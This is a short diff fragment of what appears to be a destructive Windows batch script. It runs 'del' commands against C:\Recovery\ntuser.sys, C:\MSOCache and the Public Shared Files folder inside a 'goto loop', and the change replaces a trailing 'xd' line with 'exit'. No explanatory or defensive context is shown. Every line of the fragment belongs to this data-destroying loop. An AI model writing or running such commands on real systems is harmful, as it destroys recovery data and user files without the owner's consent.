@@ -13,5 +13,4 @@ del "C:\Recovery\ntuser.sys"
 del "C:\MSOCache" /p
 del "C:\Users\Public\Shared Files" 
 goto loop
-
-xd
+exit
